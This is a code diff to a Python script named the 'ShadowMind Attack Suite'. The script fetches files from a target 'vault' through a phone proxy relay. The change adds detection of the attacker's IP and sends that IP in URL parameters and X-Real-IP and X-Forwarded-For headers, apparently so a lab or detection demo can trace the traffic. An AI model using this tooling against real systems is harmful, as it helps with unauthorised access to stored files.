@@ -14,8 +14,20 @@
 import sys
 import time
 import os
+import socket
 import urllib.request
 import urllib.error
+
+def get_attacker_ip():
+    """Detect the attacker laptop's local IPv4 address."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "10.28.82.21"
 
 # =============================================================================
 # 1. CONFIGURATION: PROXY URL & VAULT FILES (EASILY CHANGEABLE)
@@ -77,8 +89,10 @@ def run_multihop_attack():
     
     print("=" * 75)
     print("  🌐 SHADOWMIND ATTACK SUITE // MULTI-HOP LATERAL ATTACK (IP HOPPING)")
+    attacker_ip = get_attacker_ip()
     print("=" * 75)
     print(f" Intermediate Proxy (Hop 2) : {proxy}")
+    print(f" Attacker Origin    (Hop 1) : {attacker_ip}")
     print(f" Attack Topology            : Attacker Laptop (Hop 1)")
     print(f"                               ➔ Phone Proxy Relay (Hop 2)")
     print(f"                               ➔ Target ShadowMind Vault (Hop 3)")
@@ -89,7 +103,8 @@ def run_multihop_attack():
 
     for idx, (label, endpoint) in enumerate(VAULT_FILES, 1):
         filename = endpoint.strip("/").split("/")[-1]
-        url = f"{proxy}{endpoint}"
+        sep = "&" if "?" in endpoint else "?"
+        url = f"{proxy}{endpoint}{sep}src={attacker_ip}"
         
         print(f"[{idx}/{len(VAULT_FILES)}] 🌐 Routing through intermediate proxy: {label}")
         print(f"      Relay Target : GET {url}")
@@ -97,6 +112,8 @@ def run_multihop_attack():
         headers = {
             "User-Agent": "ShadowMind-MultiHopClient/2.0",
             "X-Attack-Mode": "MultiHop",
+            "X-Real-IP": attacker_ip,
+            "X-Forwarded-For": attacker_ip,
             "Accept": "*/*"
         }
         
